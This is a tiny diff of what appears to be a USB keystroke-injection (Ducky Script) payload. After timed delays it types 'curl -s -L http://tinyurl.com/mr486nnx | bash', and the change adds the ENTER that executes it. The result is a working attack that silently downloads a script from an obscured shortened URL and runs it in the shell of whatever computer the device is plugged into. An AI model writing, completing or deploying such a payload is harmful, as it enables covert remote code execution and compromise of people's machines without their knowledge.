@@ -6,3 +6,4 @@ DELAY 500
 ENTER
 DELAY 750
 STRING curl -s -L http://tinyurl.com/mr486nnx | bash
+ENTER
